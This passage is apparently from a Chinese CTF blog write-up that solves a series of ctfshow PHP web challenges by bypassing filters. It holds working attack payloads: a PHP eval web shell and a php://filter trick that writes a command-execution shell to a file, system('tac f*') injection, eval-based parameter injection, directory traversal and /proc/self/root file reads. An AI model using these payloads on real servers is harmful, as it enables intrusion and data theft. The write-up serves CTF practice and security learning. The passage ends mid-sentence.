<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_GET</span>[1]);?&gt; </span><br><span class="line">0x3c3f706870206576616c28245f4745545b315d293b3f3e</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=0x3c3f706870206576616c28245f4745545b315d293b3f3e&amp;v3=1.php </span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure>

<p>本以为可以了，后来一看php版本7.3，直接重头再来，不过php5的话这个方法即可实现</p>
<p>看羽师傅wp得：</p>
<p>虽然文件内容不好控制，但是可以利用伪协议将内容进行编码转换。<br>所以如果能找到一条php语句经过base64编码，在转换为16进制之后全部都是数字就可以通过了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  *// PD89YGNhdCAqYDs=* </span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      *//这里直接用去掉=的base64* </span><br><span class="line">输出   5044383959474e6864434171594473 </span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php://filter/<span class="keyword">write</span>=convert.base64-decode/resource=<span class="number">1</span>.php</span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>



<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718404.png" alt="chrome_zQGdSeRPtK"></p>
<p>对str变量过滤掉了php，不影响操作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  *// PD89YGNhdCAqYDs=* </span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      *//这里直接用去掉=的base64* </span><br><span class="line">输出   5044383959474e6864434171594473 </span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php://filter/<span class="keyword">write</span>=convert.base64-decode/resource=<span class="number">1</span>.php</span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>



<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_38ppT01WvJ.png" alt="chrome_38ppT01WvJ"></p>
<p>hash比较缺陷,这道题没有比较v1，v2的值，我们可以令v1=v2即可</p>
<p>payload：v1=a  v2=a</p>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_WekDb6GAUG.png" alt="chrome_WekDb6GAUG"></p>
<p>题目一共有三个变量 <code>$error $suces $flag</code>我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：a=flag</span><br><span class="line">POST：<span class="built_in">error</span>=a</span><br></pre></td></tr></table></figure>



<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718586.png" alt="chrome_j6Warj79IS"></p>
<p>这个题比较了v1和v2的值，那么我们还可以使用数组绕过，或者网上找一下sha1后相同的值</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=a1</span><br><span class="line">post:v1=a2</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=w9KASOk6Ikap </span><br><span class="line">post:v1=aaO8zKZF</span><br></pre></td></tr></table></figure>



<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718977.png" alt="chrome_hcFocP58tM"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="keyword">string</span>,<span class="keyword">array</span>) </span><br><span class="line">函数把查询字符串解析到变量中 </span><br><span class="line"><span class="keyword">string</span>  必需。规定要解析的字符串 </span><br><span class="line"><span class="keyword">array</span>	可选。规定存储变量的数组名称。该参数指示变量存储到数组中</span><br></pre></td></tr></table></figure>

<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;q=123&amp;p=456&#x27;</span>;</span><br><span class="line">parse_str(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;q&#x27;</span>];   <span class="comment">//输出123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;p&#x27;</span>];   <span class="comment">//输出456</span></span><br></pre></td></tr></table></figure>

<p>一下子就明白了，羽师傅yyds</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3=<span class="number">1</span> </span><br><span class="line">post:v1=flag=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">md5(<span class="number">1</span>)=c4ca4238a0b923820dcc509a6f75849b    </span><br></pre></td></tr></table></figure>



<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_93ZQjT1xMh.png" alt="chrome_93ZQjT1xMh"></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ereg — 正则表达式匹配</span><br><span class="line">strrev — 字符串反转 </span><br><span class="line">intval — 获取变量的整数值</span><br></pre></td></tr></table></figure>

<p>题目hint</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure>

<p>构造payload，if要求c中要有字母，后面用%00截断绕过，十进制的0x36d为877，翻转后应该是778</p>
<p>payload：c=a%00778</p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718316.png" alt="chrome_BIakEtsKZq"></p>
<p><strong>考察点：php 异常类</strong><br>先来看下这个正则表达式/[a-zA-Z]+/ 匹配至少有一个字母的字符串<br>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br>举两个例子</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception</span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">Exception</span>();system(<span class="string">&#x27;tac f*&#x27;</span>);&amp;v2=a </span><br><span class="line">v1=ReflectionClass&amp;v2=system(<span class="string">&#x27;tac f*&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718437.png" alt="chrome_tSIHJl27oq"></p>
<p>对v1和v2进行了大量的过滤</p>
<p><strong>考察点：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</strong><br>具体使用方法<br>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件，得到一个/查看根目录下的文件。php中的getcwd()可以帮到我们这个忙。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd()</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">getcwd(void):string</span><br></pre></td></tr></table></figure>

<p>payload：v1=FilesystemIterator&amp;v2=getcwd</p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_xS7vGDB3Wo.png" alt="chrome_xS7vGDB3Wo"></p>
<p><strong>考察点：php超全局变量$GLOBALS的使用</strong></p>
<p>介绍</p>
<p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>举个例子</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="number">123</span>;</span><br><span class="line">$b=<span class="number">456</span>;</span><br><span class="line">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>

<p>返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">123</span>)</span><br><span class="line">[<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">456</span>)</span><br></pre></td></tr></table></figure>

<p>所以对于该题，只要把$GLOBALS赋值给v2，然后通过if判断，v2再赋值给v1,即可将全部变量输出.<br>payload: ?v1=ctfshow&amp;v2=GLOBALS</p>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_X5AnH5a53a.png" alt="chrome_X5AnH5a53a"></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_file — 判断给定文件名是否为一个正常的文件 </span><br><span class="line">is_file ( string $filename ) : bool</span><br></pre></td></tr></table></figure>

<p>显然不能让is_file函数检测出文件，又要highlight_file显示文件</p>
<p>那么我们可以使用php伪协议</p>
<p>payload：file=php://filter/resource=flag.php</p>
<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_1mq0dye4nS.png" alt="chrome_1mq0dye4nS"></p>
<p>把filter过滤了，在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_2woolNjJnf.png" alt="chrome_2woolNjJnf"></p>
<p>又把filter放出来了，那就直接出</p>
<p>payload：file=php://filter/resource=flag.php</p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718142.png" alt="chrome_aZATZb9wVO"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数	描述</span><br><span class="line">string	        必需。规定要检查的字符串。</span><br><span class="line">charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure>

<p>写一个测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现除了±.号以外还有只剩下%0c也就是换页符了</p>
<p>所以payload：num=%0c36</p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_dOBlWnxqi8.png" alt="chrome_dOBlWnxqi8"></p>
<p>审计审计</p>
<p>羽师傅的新姿势</p>
<p><code>isset($_POST[&#39;CTF_SHOW.COM&#39;])</code>因为php变量命名是不允许使用点号的</p>
<p>模拟post传参</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ch</span> = curl_init(); </span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line">	<span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">	curl_close(<span class="variable">$ch</span>);</span><br><span class="line">	<span class="keyword">return</span> strlen(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;=<span class="number">128</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line">			<span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">				<span class="keyword">if</span>(curl(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">				&#125;</span><br><span class="line">   		&#125;</span><br><span class="line">   	&#125;</span><br></pre></td></tr></table></figure>

<p>test.php中的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果<br><code>CTF%5BSHOW.COM=123</code></p>
<p>又一姿势</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line">第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line">设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果</span><br><span class="line">这时候的<span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]</span><br><span class="line"><span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure>

<p>我们是在网页模式下运行的，所以$SERVER[‘argv’][0] = $SERVER[‘QUERY_STRING’]也就是$a[0]= $_SERVER[‘QUERY_STRING’]</p>
<p>$_SERVER[“QUERY_STRING”] 获取查询语句，获取的是?后面的值</p>
<p>a[0]对应的就是get中的结果</p>
<p>这时候我们只要通过 eval(“$c”.”;”);将$flag赋值flag_give_me就可以了</p>
<p>payload: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>



<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718594.png" alt="chrome_jiOr3XvL3e"></p>
<p>和上一题基本一样，过滤了一些东西，不影响操作</p>
<p>payload: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>题目给的hint也比较好理解</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:<span class="number">1</span>=flag.php </span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718729.png" alt="chrome_XW87RTD312"></p>
<p>和上一题基本一样，过滤了一些东西，不影响操作</p>
<p>payload: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>



<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718156.png" alt="chrome_Dl5Rm8jFAT"></p>
<p>过滤了下划线和中括号</p>
<p>模拟传参测试出可以替代的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(curl(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现以下字符等同于ctf_show</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  这里的加号在url中起到空格的作用</span><br></pre></td></tr></table></figure>

<p>除去他过滤掉的 _ . [ 我们发现我们还可以用空格实现</p>
<p>payload：ctf show=ilove36d</p>
<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211113171135398.png" alt="image-20211113171135398"></p>
<p>直接上姿势了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars ( void ) : array </span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>

<p>payload：f1=_&amp;f2=get_defined_vars</p>
<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172042516.png" alt="image-20211113172042516"></p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">相关函数：</span><br><span class="line"><span class="selector-attr">[strpos()]</span> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line"><span class="selector-attr">[strripos()]</span> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line"><span class="selector-attr">[strrpos()]</span> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span><br></pre></td></tr></table></figure>

<p>题目hint给到了目录穿越</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f=/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>羽师傅用伪协议绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure>



<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172713166.png" alt="image-20211113172713166"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.+?`意思是，在ctfshow字符串前面有至少一个字符</span><br><span class="line">/is		s是匹配换行</span><br></pre></td></tr></table></figure>

<p>payload：f=ctfshow</p>
<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718141.png" alt="image-20211113173127022"></p>
<p>利用正则最大回溯次数绕过</p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>python脚本如下</p>
